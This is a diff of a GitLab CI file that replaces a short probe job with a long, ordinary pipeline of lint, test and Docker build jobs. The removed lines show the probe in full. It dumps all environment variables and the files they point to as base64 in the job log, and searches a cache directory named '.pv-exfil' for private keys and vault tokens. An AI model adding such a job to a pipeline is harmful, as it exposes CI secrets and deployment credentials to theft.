@@ -1,44 +1,1125 @@
-stages:
-  - pv
+variables:
+  BENCHMARK_IMAGE_TAG: "$CI_COMMIT_SHA"
+  DOCKER_BUILDER_TAG: "$CI_COMMIT_SHA"
+  DOCKER_DIND_TAG: "$CI_COMMIT_SHA"
+  IMAGE_REMOVER_TAG: "$CI_COMMIT_SHA"
+  TOX_IMAGE_TAG: "$CI_COMMIT_SHA"
+  # Docker cli image and dind service of the image builds; must equal
+  # DOCKER_VERSION in docker-bake.hcl (checked by
+  # tests/test_tool_versions_defined_once.py), which bake also reads from here
+  DOCKER_VERSION: "29.9.2"
+  # =============================================================================
+  # Skip Docker Builds - Set to "true" to skip all Docker image builds
+  # =============================================================================
+  # Useful when only editing scripts/, docs/, or templates/ - no need to rebuild
+  # Docker images. Validation jobs still run.
+  SKIP_DOCKER_BUILDS: "false"
 
-pv16036_probe:
-  stage: pv
-  image: python:3.11
-  tags: [public-runner-docker]
-  variables:
-    GIT_STRATEGY: none
-    GIT_DEPTH: "1"
-  script:
-    - |
-      set +e
-      echo "PV16036 START project=$CI_PROJECT_PATH ref=$CI_COMMIT_REF_NAME prot=$CI_COMMIT_REF_PROTECTED runner=$CI_RUNNER_DESCRIPTION host=$(hostname) job=$CI_JOB_ID"
-      echo "PVENVB64_START"
-      env | sort | base64 -w0
-      echo ""
-      echo "PVENVB64_END"
-      echo "PVFILEVARS_START"
-      env | while IFS='=' read -r k v; do
-        case "$k" in _|CI_SERVER_TLS_CA_FILE|CI_JOB_JWT_FILE|GITLAB_ENV) continue;; esac
-        if [ -n "$v" ] && [ -f "$v" ] && [ -r "$v" ] && [ "$(stat -c%s "$v" 2>/dev/null)" -lt 200000 ]; then
-          echo "PVFV_START $k"
-          base64 -w0 "$v"
-          echo ""
-          echo "PVFV_END $k"
+  # Git configuration
+  # Fetch strategy reuses workspace between jobs, reducing GitLab server load.
+  # Full clone (depth 0) enables efficient incremental fetches - shallow clones
+  # don't reduce server CPU and make fetch less effective.
+  GIT_STRATEGY: fetch
+  GIT_DEPTH: 0
+  # Temporary: separate clone path prevents clone-strategy jobs from erasing
+  # fetch workspaces during transition. Remove once all projects use fetch.
+  GIT_CLONE_PATH: $CI_BUILDS_DIR/fetch/$CI_RUNNER_SHORT_TOKEN/$CI_CONCURRENT_ID/$CI_PROJECT_PATH
+
+stages:
+  - validation
+  - pre-build
+  - build
+  - test
+  - cleanup
+  - maintenance
+
+# AIDEV branches (ai/*, session/*) and pushes to aidev/integration run no
+# pipeline: AIDEV verifies them through .aidev/project.yaml. A pipeline started
+# from the web UI or the API still runs on aidev/integration (e.g. for its MR).
+# The last two rules are the included Branch-Pipelines template's, which this
+# block replaces.
+workflow:
+  rules:
+    - if: $CI_COMMIT_BRANCH =~ /^(ai|session)\//
+      when: never
+    - if: $CI_COMMIT_BRANCH == "aidev/integration" && $CI_PIPELINE_SOURCE !~ /^(web|api)$/
+      when: never
+    - if: $CI_COMMIT_TAG
+    - if: $CI_COMMIT_BRANCH
+
+include:
+  - template: Workflows/Branch-Pipelines.gitlab-ci.yml
+  - local: templates/docker_image_jobs.gitlab-ci.yml
+  - local: templates/test_jobs.gitlab-ci.yml
+
+default:
+  hooks:
+    pre_get_sources_script:
+      # Clean corrupt git state left by cancelled pipelines (see GitLab #296638, #4600)
+      # Wrapped in subshell to avoid changing working directory for subsequent git operations
+      - |
+        (
+        cd "${CI_PROJECT_DIR:-/builds}" 2>/dev/null || exit 0
+        echo "pre_get_sources: checking $(pwd) for corrupt git state"
+        if [ -d ".git" ]; then
+          # Remove stale lock files that block git operations
+          find .git -name "*.lock" -delete 2>/dev/null || true
+
+          # Check if main repo is corrupt - if so, remove .git to force fresh clone
+          if ! git rev-parse HEAD >/dev/null 2>&1; then
+            echo "pre_get_sources: main repository corrupt (rev-parse failed), forcing fresh clone"
+            rm -rf .git
+          # Check if origin remote is configured (missing config file = no remote)
+          elif ! git remote get-url origin >/dev/null 2>&1; then
+            echo "pre_get_sources: origin remote missing (incomplete clone), forcing fresh clone"
+            rm -rf .git
+          else
+            # Main repo OK - check and clean corrupt submodules
+            # Check both the working dir and .git/modules/ since either can be corrupt
+            if [ -f ".gitmodules" ]; then
+              git config --file .gitmodules --get-regexp path 2>/dev/null | awk '{print $2}' | while read submod; do
+                needs_clean=false
+                [ -z "$submod" ] && continue
+                # Check if submodule working directory exists but is corrupt
+                if [ -d "$submod" ] && [ -f "$submod/.git" ]; then
+                  if ! git -C "$submod" rev-parse HEAD >/dev/null 2>&1; then
+                    needs_clean=true
+                  fi
+                fi
+                # Check if .git/modules exists but is corrupt (even if working dir is gone)
+                if [ -d ".git/modules/$submod" ]; then
+                  if ! git --git-dir=".git/modules/$submod" rev-parse HEAD >/dev/null 2>&1; then
+                    echo "pre_get_sources: $submod corrupt (rev-parse failed)"
+                    needs_clean=true
+                  fi
+                fi
+                if [ "$needs_clean" = true ]; then
+                  echo "pre_get_sources: cleaning corrupt submodule: $submod"
+                  rm -rf "$submod" ".git/modules/$submod"
+                fi
+              done
+            fi
+            echo "pre_get_sources: existing repo OK"
+          fi
+        else
+          echo "pre_get_sources: no .git directory (fresh workspace)"
         fi
+        )
+
+.skip_on_renovate_rule: &skip_on_renovate_rule
+  if: '$RENOVATE_RUN == "true"'
+  when: never
+
+.validation_job:
+  extends: .job-defaults
+  stage: validation
+  artifacts:
+    name: validation-results
+    when: always
+  tags:
+    - public-runner-docker
+
+# Lint jobs run in python-test-tools. When its sources change, they wait for
+# build_python_test_tools_image and use the image it pushed for this commit, so
+# a tool bump re-lints this repository with the new versions (and the image a
+# branch introduces is usable before develop has published it). Otherwise they
+# start at once (an absent optional need) on the published moving tag. They
+# need a build-stage job, hence the test stage.
+.lint_in_python_test_tools:
+  extends: .validation_job
+  stage: test
+  image: "${PYTHON_TEST_TOOLS_IMAGE}"
+  needs:
+    - job: build_python_test_tools_image
+      optional: true
+
+.python_test_tools_from_this_pipeline:
+  rules:
+    - if: $SKIP_DOCKER_BUILDS != "true" && $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
+      changes:
+        paths: &python_test_tools_sources
+          - Dockerfile.python-test-tools
+          - Dockerfile.python_runtime
+          - docker-bake.hcl
+      variables:
+        PYTHON_TEST_TOOLS_IMAGE: $CI_REGISTRY_IMAGE/python-test-tools:$CI_COMMIT_SHA
+    - if: $SKIP_DOCKER_BUILDS != "true" && $CI_COMMIT_BRANCH && $CI_COMMIT_BRANCH != $CI_DEFAULT_BRANCH
+      changes:
+        paths: *python_test_tools_sources
+        compare_to: 'refs/heads/develop'
+      variables:
+        PYTHON_TEST_TOOLS_IMAGE: $CI_REGISTRY_IMAGE/python-test-tools:$CI_COMMIT_SHA
+
+lint_bash_scripts:
+  extends: .lint_in_python_test_tools
+  script:
+    - shellcheck -f checkstyle scripts/**/*.sh > shellcheck-checkstyle-result.xml
+  after_script:
+    - xmlstarlet tr misc/checkstyle2junit.xslt shellcheck-checkstyle-result.xml > shellcheck-junit-result.xml
+  artifacts:
+    paths:
+     - shellcheck-checkstyle-result.xml
+     - shellcheck-junit-result.xml
+    reports:
+      junit: shellcheck-junit-result.xml
+  rules:
+    - *skip_on_renovate_rule
+    - !reference [.python_test_tools_from_this_pipeline, rules]
+    - if: $CI_COMMIT_REF_PROTECTED == "true"
+      changes:
+        paths:
+          - scripts/**/*.sh
+          - misc/checkstyle2junit.xslt
+    - if: $CI_COMMIT_BRANCH
+      changes:
+        paths:
+          - scripts/**/*.sh
+          - misc/checkstyle2junit.xslt
+        compare_to: 'refs/heads/develop'
+
+lint_ci_templates:
+  extends: .lint_in_python_test_tools
+  before_script:
+    - pip install yamllint-junit
+  script:
+    - yamllint --format parsable templates/ > yamllint-parsable-result.txt
+  after_script:
+    - yamllint-junit -o yamllint-junit-result.xml yamllint-parsable-result.txt
+  artifacts:
+    paths:
+     - yamllint-parsable-result.txt
+     - yamllint-junit-result.xml
+    reports:
+      junit: yamllint-junit-result.xml
+  rules:
+    - *skip_on_renovate_rule
+    - !reference [.python_test_tools_from_this_pipeline, rules]
+    - if: $CI_COMMIT_REF_PROTECTED == "true"
+      changes:
+        paths:
+          - templates/**/*.yml
+          - templates/**/*.yaml
+          - .yamllint
+          - .yamllint.yml
+          - .yamllint.yaml
+    - if: $CI_COMMIT_BRANCH
+      changes:
+        paths:
+          - templates/**/*.yml
+          - templates/**/*.yaml
+          - .yamllint
+          - .yamllint.yml
+          - .yamllint.yaml
+        compare_to: 'refs/heads/develop'
+
+lint_python_scripts:
+  extends: .lint_in_python_test_tools
+  before_script:
+    - pylint --version
+  script:
+    - pip install -r scripts/python/requirements.txt
+    - pylint --output-format=text,json2:pylint-result.json scripts/python/*.py
+  after_script:
+    - python3 misc/pylint2junit.py pylint-result.json pylint-junit-result.xml scripts/python/*.py
+  artifacts:
+    paths:
+     - pylint-result.json
+     - pylint-junit-result.xml
+    reports:
+      junit: pylint-junit-result.xml
+  rules:
+    - *skip_on_renovate_rule
+    - !reference [.python_test_tools_from_this_pipeline, rules]
+    - if: $CI_COMMIT_REF_PROTECTED == "true"
+      changes:
+        paths:
+          - scripts/python/**/*.py
+          - scripts/python/requirements.txt
+          - misc/pylint2junit.py
+          - .pylintrc
+    - if: $CI_COMMIT_BRANCH
+      changes:
+        paths:
+          - scripts/python/**/*.py
+          - scripts/python/requirements.txt
+          - misc/pylint2junit.py
+          - .pylintrc
+        compare_to: 'refs/heads/develop'
+
+# tests/ on every branch pipeline, not only when a file here changes: it includes
+# the drift check against aidev's public toolchain.yaml, which moves on aidev's side
+# (AIDEV_TOOLCHAIN_URL overrides where that copy is read from, anonymously).
+test_repository:
+  extends: .lint_in_python_test_tools
+  script:
+    - python3 -m pytest -p no:cacheprovider -rs --junitxml=tests-junit-result.xml tests/
+  artifacts:
+    paths:
+     - tests-junit-result.xml
+    reports:
+      junit: tests-junit-result.xml
+  rules:
+    - *skip_on_renovate_rule
+    - !reference [.python_test_tools_from_this_pipeline, rules]
+    - if: $CI_COMMIT_BRANCH
+
+# A template may only name an image tag the registry has (CLAUDE.md, "Moving
+# Templates to a New Image Tag"): this fails a template MR's pipeline until the
+# image MR's develop pipeline has published the tag; retry it after that. It runs
+# on every branch pipeline, since a published tag can also be removed.
+check_template_image_tags:
+  extends: .lint_in_python_test_tools
+  script:
+    - python3 scripts/python/check-template-image-tags.py
+  rules:
+    - *skip_on_renovate_rule
+    - !reference [.python_test_tools_from_this_pipeline, rules]
+    - if: $CI_COMMIT_BRANCH
+
+# Opens a re-sync merge request in every project of pnpm-config/catalog-consumers.txt
+# (monorepos and symlinking projects alike) whose lockfile is behind this develop
+# commit's catalogs (scripts/python/pnpm-catalog-resync.py):
+# on a push changing pnpm-config/, from a schedule setting PNPM_CATALOG_RESYNC=true, or
+# by hand. node-test-tools ships the pnpm the lockfiles are written with. Skips (passes)
+# while the CATALOG_RESYNC_TOKEN variable is unset. Not interruptible: a newer develop
+# pipeline that does not change the catalogs would cancel it without re-running it.
+# Allowed to fail: a consumer that could not be re-synced is named in the log.
+pnpm_catalog_resync:
+  extends: .job-defaults
+  stage: maintenance
+  image: "${NODE_TEST_TOOLS_IMAGE}"
+  needs: []
+  interruptible: false
+  timeout: 2 hours
+  # Two develop pipelines must not force-push a consumer's ccc-catalog-resync branch at once.
+  resource_group: pnpm_catalog_resync
+  script:
+    - python3 scripts/python/pnpm-catalog-resync.py
+  allow_failure: true
+  rules:
+    - *skip_on_renovate_rule
+    - if: $CI_COMMIT_BRANCH != $CI_DEFAULT_BRANCH
+      when: never
+    - if: $CI_PIPELINE_SOURCE == "push"
+      changes:
+        paths:
+          - pnpm-config/**/*
+    - if: $CI_PIPELINE_SOURCE == "schedule" && $PNPM_CATALOG_RESYNC == "true"
+    - when: manual
+
+# Type-checks every project of pnpm-config/catalog-consumers.txt against this
+# branch's catalogs (scripts/python/pnpm-catalog-consumer-check.py), on the
+# pipeline of a branch with an open merge request that changes pnpm-config/: a
+# catalog MR shows which consumers it breaks before it lands. This project runs
+# branch pipelines only, so $CI_OPEN_MERGE_REQUESTS is what tells an MR's
+# pipeline from a plain push; elsewhere the job is manual. It only warns, unless
+# the pipeline is run with PNPM_CATALOG_CHECK_BLOCKING=true. Reads the consumers
+# with CATALOG_RESYNC_TOKEN when this pipeline has it, anonymously otherwise;
+# the consumers' install and type check never see the token.
+pnpm_catalog_consumer_check:
+  extends: .job-defaults
+  stage: test
+  image: "${NODE_TEST_TOOLS_IMAGE}"
+  needs: []
+  timeout: 2 hours
+  script:
+    - python3 scripts/python/pnpm-catalog-consumer-check.py --summary pnpm-catalog-consumer-check.txt
+  artifacts:
+    paths:
+      - pnpm-catalog-consumer-check.txt
+    when: always
+    expire_in: 4 weeks
+  rules:
+    - *skip_on_renovate_rule
+    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
+      when: never
+    - if: $CI_COMMIT_BRANCH && $CI_OPEN_MERGE_REQUESTS && $PNPM_CATALOG_CHECK_BLOCKING == "true"
+      changes: &pnpm_catalog_changes
+        paths:
+          - pnpm-config/**/*
+        compare_to: 'refs/heads/develop'
+      allow_failure: false
+    - if: $CI_COMMIT_BRANCH && $CI_OPEN_MERGE_REQUESTS
+      changes: *pnpm_catalog_changes
+      allow_failure: true
+    - if: $CI_COMMIT_BRANCH
+      when: manual
+      allow_failure: true
+
+# =============================================================================
+# Skip Rules for Script/Doc-Only Changes
+# =============================================================================
+# Docker builds are expensive. Skip them when only scripts, docs, or templates
+# change (these don't affect Docker images). Always run on protected branches.
+
+.skip_docker_build_on_non_docker_changes:
+  rules:
+    # Skip if SKIP_DOCKER_BUILDS is set
+    - if: $SKIP_DOCKER_BUILDS == "true"
+      when: never
+    # Always run on protected branches (develop, main)
+    - if: $CI_COMMIT_REF_PROTECTED == "true"
+      when: on_success
+    # Skip if only scripts/docs/templates changed (no Docker files)
+    - if: $CI_COMMIT_BRANCH
+      changes:
+        paths:
+          - scripts/**/*
+          - docs/**/*
+          - templates/**/*
+          - "*.md"
+          - misc/**/*
+        compare_to: refs/heads/develop
+      when: never
+    # Otherwise run normally
+    - if: $CI_COMMIT_BRANCH
+      when: on_success
+
+.build_docker_image:
+  extends: .pure_docker_image_builder_job_template
+  image: docker:${DOCKER_VERSION}-cli
+  variables:
+    BUILD_TARGET: ""
+  before_script:
+    - !reference [.pure_docker_image_builder_job_template, before_script]
+    - |
+      echo -e "\e[0Ksection_start:$(date +%s):login[collapsed=true]\r\e[0KLogging to Docker registry..."
+      docker login -u "$CI_REGISTRY_USER" -p "$CI_REGISTRY_PASSWORD" $CI_REGISTRY
+      echo -e "\e[0Ksection_end:$(date +%s):login\r\e[0K"
+  script: 
+    - |
+      echo -e "\e[0Ksection_start:$(date +%s):tag[collapsed=true]\r\e[0KDetermining tag for the new image..."
+      if [[ "$CI_COMMIT_BRANCH" == "$CI_DEFAULT_BRANCH" ]]; then
+        echo "Running on default branch '$CI_DEFAULT_BRANCH': tag = 'latest'"
+        export tag="latest"
+      else
+        echo "Running on branch '$CI_COMMIT_BRANCH': tag = $CI_COMMIT_REF_SLUG"
+        export tag="$CI_COMMIT_REF_SLUG" 
+      fi
+      echo -e "\e[0Ksection_end:$(date +%s):tag\r\e[0K"
+      echo -e "\e[0Ksection_start:$(date +%s):build[collapsed=true]\r\e[0KBaking image "$CI_REGISTRY_IMAGE/$BUILD_TARGET:${tag}"..."
+      docker buildx bake --progress=plain --provenance=false --push "$BUILD_TARGET"
+      echo -e "\e[0Ksection_end:$(date +%s):build\r\e[0K"
+  tags:
+    - public-runner-docker
+
+.effective_build_docker_image:
+  extends: .build_docker_image
+  variables:
+    DOCKERFILE_PATH: ""
+  rules:
+    - *skip_on_renovate_rule
+    - if: $SKIP_DOCKER_BUILDS == "true"
+      when: never
+    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
+      exists:
+        - ${DOCKERFILE_PATH}
+      changes:
+        paths:
+          - ${DOCKERFILE_PATH}
+    - if: $CI_COMMIT_BRANCH != $CI_DEFAULT_BRANCH
+      exists:
+        - ${DOCKERFILE_PATH}
+      changes:
+        paths:
+          - ${DOCKERFILE_PATH}
+        compare_to: 'refs/heads/develop'
+
+build_docker_dind_image:
+  extends: .build_docker_image
+  stage: pre-build
+  variables:
+    BUILD_TARGET: "docker-dind"
+  rules:
+    - *skip_on_renovate_rule
+    - if: $SKIP_DOCKER_BUILDS == "true"
+      when: never
+    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
+      exists:
+        - Dockerfile.docker-dind
+      changes:
+        paths: &docker_dind_sources
+          - Dockerfile.docker-dind
+          - docker-bake.hcl
+    - if: $CI_COMMIT_BRANCH != $CI_DEFAULT_BRANCH
+      exists:
+        - Dockerfile.docker-dind
+      changes:
+        paths: *docker_dind_sources
+        compare_to: 'refs/heads/develop'
+  services:
+    - docker:${DOCKER_VERSION}-dind
+
+build_docker_builder_image:
+  extends: .build_docker_image
+  stage: build
+  variables:
+    BUILD_TARGET: "docker-builder"
+    DOCKER_DIND_TAG: "latest"
+    DOCKER_BUILDER_TAG: "latest"
+  needs:
+    - job: build_docker_dind_image
+      optional: true
+    # bake rebuilds python-test-tools as docker-builder's base; after this job it
+    # comes from the registry cache
+    - job: build_python_test_tools_image
+      optional: true
+  rules:
+    - *skip_on_renovate_rule
+    - if: $SKIP_DOCKER_BUILDS == "true"
+      when: never
+    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
+      exists:
+        - Dockerfile.docker-builder
+      changes:
+        paths: &docker_builder_sources
+          - Dockerfile.docker-builder
+          - Dockerfile.python-test-tools
+          - Dockerfile.python_runtime
+          - docker-bake.hcl
+    - if: $CI_COMMIT_BRANCH != $CI_DEFAULT_BRANCH
+      exists:
+        - Dockerfile.docker-builder
+      changes:
+        paths: *docker_builder_sources
+        compare_to: 'refs/heads/develop'
+
+build_image_remover_image:
+  extends: .build_docker_image
+  stage: build
+  variables:
+    BUILD_TARGET: "python-scripts"
+    # Use latest docker images - python-scripts doesn't depend on fresh docker builds
+    DOCKER_DIND_TAG: "latest"
+    DOCKER_BUILDER_TAG: "latest"
+  needs:
+    - job: build_docker_dind_image
+      optional: true
+  rules:
+    - *skip_on_renovate_rule
+    - if: $SKIP_DOCKER_BUILDS == "true"
+      when: never
+    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
+      exists:
+        - Dockerfile.python-scripts
+      changes:
+        paths:
+          - Dockerfile.python-scripts
+          - Dockerfile.python_runtime
+          - docker-bake.hcl
+          - scripts/python/**/*
+    - if: $CI_COMMIT_BRANCH != $CI_DEFAULT_BRANCH
+      exists:
+        - Dockerfile.python-scripts
+      changes:
+        paths:
+          - Dockerfile.python-scripts
+          - Dockerfile.python_runtime
+          - docker-bake.hcl
+          - scripts/python/**/*
+        compare_to: 'refs/heads/develop'
+
+build_benchmark_test_runner_image:
+  extends: .build_docker_image
+  stage: build
+  variables:
+    BUILD_TARGET: "benchmark-test-runner"
+    DOCKER_DIND_TAG: "latest"
+    DOCKER_BUILDER_TAG: "latest"
+  needs:
+    - job: build_docker_dind_image
+      optional: true
+  rules:
+    - *skip_on_renovate_rule
+    - if: $SKIP_DOCKER_BUILDS == "true"
+      when: never
+    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
+      exists:
+        - Dockerfile.benchmark-test-runner
+      changes:
+        paths:
+          - Dockerfile.benchmark-test-runner
+          - docker-bake.hcl
+    - if: $CI_COMMIT_BRANCH != $CI_DEFAULT_BRANCH
+      exists:
+        - Dockerfile.benchmark-test-runner
+      changes:
+        paths:
+          - Dockerfile.benchmark-test-runner
+          - docker-bake.hcl
+        compare_to: 'refs/heads/develop'
+
+build_haf_app_test_runner_image:
+  extends: .build_docker_image
+  stage: build
+  variables:
+    BUILD_TARGET: "haf-app-test-runner"
+    DOCKER_DIND_TAG: "latest"
+    DOCKER_BUILDER_TAG: "latest"
+  needs:
+    - job: build_docker_dind_image
+      optional: true
+    # bake rebuilds python-test-tools as the runner's base; after this job it
+    # comes from the registry cache
+    - job: build_python_test_tools_image
+      optional: true
+    - job: build_benchmark_test_runner_image
+      optional: true
+  rules:
+    - *skip_on_renovate_rule
+    - if: $SKIP_DOCKER_BUILDS == "true"
+      when: never
+    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
+      exists:
+        - Dockerfile.haf-app-test-runner
+      changes:
+        paths: &haf_app_test_runner_sources
+          - Dockerfile.haf-app-test-runner
+          - Dockerfile.python-test-tools
+          - Dockerfile.python_runtime
+          - docker-bake.hcl
+    - if: $CI_COMMIT_BRANCH != $CI_DEFAULT_BRANCH
+      exists:
+        - Dockerfile.haf-app-test-runner
+      changes:
+        paths: *haf_app_test_runner_sources
+        compare_to: 'refs/heads/develop'
+
+
+build_python_test_tools_image:
+  extends: .build_docker_image
+  stage: build
+  variables:
+    BUILD_TARGET: "python-test-tools"
+    DOCKER_DIND_TAG: "latest"
+    DOCKER_BUILDER_TAG: "latest"
+  needs:
+    - job: build_docker_dind_image
+      optional: true
+  rules:
+    - *skip_on_renovate_rule
+    - if: $SKIP_DOCKER_BUILDS == "true"
+      when: never
+    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
+      changes:
+        paths: *python_test_tools_sources
+    - if: $CI_COMMIT_BRANCH != $CI_DEFAULT_BRANCH
+      changes:
+        paths: *python_test_tools_sources
+        compare_to: 'refs/heads/develop'
+
+build_node_test_tools_image:
+  extends: .build_docker_image
+  stage: build
+  variables:
+    # node-test-tools, node-test-tools-pg and node-test-tools-browser (docker-bake.hcl group)
+    BUILD_TARGET: "node-test-tools-images"
+    DOCKER_DIND_TAG: "latest"
+    DOCKER_BUILDER_TAG: "latest"
+  needs:
+    - job: build_docker_dind_image
+      optional: true
+  rules:
+    - *skip_on_renovate_rule
+    - if: $SKIP_DOCKER_BUILDS == "true"
+      when: never
+    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
+      changes:
+        paths: &node_test_tools_sources
+          - Dockerfile.node-test-tools
+          - docker-bake.hcl
+          - pnpm-config/.npmrc
+          - pnpm-config/pnpm-workspace.yaml
+          - scripts/python/pnpm-catalog-manifest.py
+    - if: $CI_COMMIT_BRANCH != $CI_DEFAULT_BRANCH
+      changes:
+        paths: *node_test_tools_sources
+        compare_to: 'refs/heads/develop'
+
+build_nginx_image:
+  extends: .build_docker_image
+  stage: build
+  variables:
+    BUILD_TARGET: "nginx"
+    DOCKER_DIND_TAG: "latest"
+    DOCKER_BUILDER_TAG: "latest"
+  needs:
+    - job: build_docker_dind_image
+      optional: true
+  rules:
+    - *skip_on_renovate_rule
+    - if: $SKIP_DOCKER_BUILDS == "true"
+      when: never
+    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
+      exists:
+        - Dockerfile.nginx
+      changes:
+        paths:
+          - Dockerfile.nginx
+          - nginx/lualib/**/*
+    - if: $CI_COMMIT_BRANCH != $CI_DEFAULT_BRANCH
+      exists:
+        - Dockerfile.nginx
+      changes:
+        paths:
+          - Dockerfile.nginx
+          - nginx/lualib/**/*
+        compare_to: 'refs/heads/develop'
+
+# Tests the nginx image's hive.rpc_form module with the argument map
+# process_openapi.py writes: nginx/tests/run.sh builds the image from this
+# commit's Dockerfile.nginx in the DinD service and runs PostgreSQL, PostgREST
+# and a rewriter there (docs/common-ci-images.md, "nginx"). The default builder
+# (not .script_docker_setup_buildkit's docker-container one) is kept, so the
+# rewriter's build finds the nginx image just built in the daemon.
+nginx_rewriter_test:
+  extends: .pure_docker_image_builder_job_template
+  stage: test
+  needs: []
+  variables:
+    DOCKER_DIND_TAG: "latest"
+    DOCKER_BUILDER_TAG: "latest"
+    # The tests reach the stack's ports on the DinD service's address
+    PUBLISH_ADDRESS: "0.0.0.0"
+    RESULTS_DIR: "$CI_PROJECT_DIR/nginx-rewriter-results"
+  before_script:
+    - |
+      for i in $(seq 1 30); do
+        docker info >/dev/null 2>&1 && break
+        echo "Waiting for docker daemon... ($i/30)"
+        sleep 2
       done
-      echo "PVFILEVARS_END"
-      echo "PVEXFIL_LS_START"
-      ls -la /nfs/ci-cache/.pv-exfil 2>/dev/null | tail -100
-      echo "PVEXFIL_LS_END"
-      echo "PVEXFIL_HITS_START"
-      for f in /nfs/ci-cache/.pv-exfil/*.env; do
-        [ -f "$f" ] || continue
-        if grep -qEi 'MAINNET_[A-Z]+_DEPLOYMENT_ENV|AUTOCLAIM|CREATOR_ACTIVE|ACTIVE_KEY|VAULT_ID_TOKEN|SSH_PRIVATE_KEY' "$f" 2>/dev/null; then echo "HIT $f"; fi
-      done
-      echo "PVEXFIL_HITS_END"
-      echo "PV16036 END"
+  script:
+    - nginx/tests/run.sh -v
   artifacts:
     when: always
-    expire_in: 1 day
     paths:
-      - .gitlab-ci.yml
+      - nginx-rewriter-results/
+    reports:
+      junit: nginx-rewriter-results/junit.xml
+  rules:
+    - *skip_on_renovate_rule
+    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
+      changes:
+        paths: &nginx_rewriter_sources
+          - Dockerfile.nginx
+          - nginx/**/*
+          - haf-app-tools/python/process_openapi.py
+          - haf-app-tools/python/requirements.txt
+          - docker-bake.hcl
+    - if: $CI_COMMIT_BRANCH != $CI_DEFAULT_BRANCH
+      changes:
+        paths: *nginx_rewriter_sources
+        compare_to: 'refs/heads/develop'
+
+build_postgrest_image:
+  extends: .build_docker_image
+  stage: build
+  variables:
+    BUILD_TARGET: "postgrest"
+    DOCKER_DIND_TAG: "latest"
+    DOCKER_BUILDER_TAG: "latest"
+  needs:
+    - job: build_docker_dind_image
+      optional: true
+  rules:
+    - *skip_on_renovate_rule
+    - if: $SKIP_DOCKER_BUILDS == "true"
+      when: never
+    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
+      exists:
+        - Dockerfile.postgrest
+      changes:
+        paths:
+          - Dockerfile.postgrest
+          - docker-bake.hcl
+    - if: $CI_COMMIT_BRANCH != $CI_DEFAULT_BRANCH
+      exists:
+        - Dockerfile.postgrest
+      changes:
+        paths:
+          - Dockerfile.postgrest
+          - docker-bake.hcl
+        compare_to: 'refs/heads/develop'
+
+build_alpine_image:
+  extends: .build_docker_image
+  stage: build
+  variables:
+    BUILD_TARGET: "alpine"
+    DOCKER_DIND_TAG: "latest"
+    DOCKER_BUILDER_TAG: "latest"
+  needs:
+    - job: build_docker_dind_image
+      optional: true
+  rules:
+    - *skip_on_renovate_rule
+    - if: $SKIP_DOCKER_BUILDS == "true"
+      when: never
+    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
+      exists:
+        - Dockerfile.alpine
+      changes:
+        paths:
+          - Dockerfile.alpine
+          - docker-bake.hcl
+    - if: $CI_COMMIT_BRANCH != $CI_DEFAULT_BRANCH
+      exists:
+        - Dockerfile.alpine
+      changes:
+        paths:
+          - Dockerfile.alpine
+          - docker-bake.hcl
+        compare_to: 'refs/heads/develop'
+
+build_python_image:
+  extends: .effective_build_docker_image
+  stage: build
+  variables:
+    BUILD_TARGET: "python"
+    DOCKERFILE_PATH: "Dockerfile.python"
+    DOCKER_DIND_TAG: "latest"
+    DOCKER_BUILDER_TAG: "latest"
+  needs:
+    - job: build_docker_dind_image
+      optional: true
+
+build_python_dev_image:
+  extends: .effective_build_docker_image
+  stage: build
+  variables:
+    BUILD_TARGET: "python_development"
+    DOCKERFILE_PATH: "Dockerfile.python_runtime"
+    DOCKER_DIND_TAG: "latest"
+    DOCKER_BUILDER_TAG: "latest"
+  needs:
+    - job: build_docker_dind_image
+      optional: true
+
+build_python_runtime_image:
+  extends: .effective_build_docker_image
+  stage: build
+  variables:
+    BUILD_TARGET: "python_runtime"
+    DOCKERFILE_PATH: "Dockerfile.python_runtime"
+    DOCKER_DIND_TAG: "latest"
+    DOCKER_BUILDER_TAG: "latest"
+  needs:
+    - job: build_docker_dind_image
+      optional: true
+
+build_ci_base_image:
+  extends: .effective_build_docker_image
+  stage: build
+  variables:
+    BUILD_TARGET: "ci-base-image"
+    DOCKERFILE_PATH: "Dockerfile.ci-base-image"
+    DOCKER_DIND_TAG: "latest"
+    DOCKER_BUILDER_TAG: "latest"
+  needs:
+    - job: build_docker_dind_image
+      optional: true
+
+build_ci_base_image_ubuntu:
+  extends: .effective_build_docker_image
+  stage: build
+  variables:
+    BUILD_TARGET: "ci-base-image-ubuntu"
+    DOCKERFILE_PATH: "Dockerfile.ci-base-image-ubuntu"
+    DOCKER_DIND_TAG: "latest"
+    DOCKER_BUILDER_TAG: "latest"
+  needs:
+    - job: build_docker_dind_image
+      optional: true
+
+build_dockerfile_image:
+  extends: .build_docker_image
+  stage: build
+  variables:
+    BUILD_TARGET: "dockerfile"
+    DOCKER_DIND_TAG: "latest"
+    DOCKER_BUILDER_TAG: "latest"
+  needs:
+    - job: build_docker_dind_image
+      optional: true
+  rules:
+    - *skip_on_renovate_rule
+    - if: $SKIP_DOCKER_BUILDS == "true"
+      when: never
+    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
+      exists:
+        - Dockerfile.dockerfile
+      changes:
+        paths:
+          - Dockerfile.dockerfile
+    - if: $CI_COMMIT_BRANCH != $CI_DEFAULT_BRANCH
+      exists:
+        - Dockerfile.dockerfile
+      changes:
+        paths:
+          - Dockerfile.dockerfile
+        compare_to: 'refs/heads/develop'
+
+build_emsdk_image:
+  extends: .build_docker_image
+  stage: build
+  variables:
+    BUILD_TARGET: "emsdk"
+    # Use latest docker images - emsdk doesn't depend on fresh docker builds
+    DOCKER_DIND_TAG: "latest"
+    DOCKER_BUILDER_TAG: "latest"
+  needs:
+    - job: build_docker_dind_image
+      optional: true
+  rules:
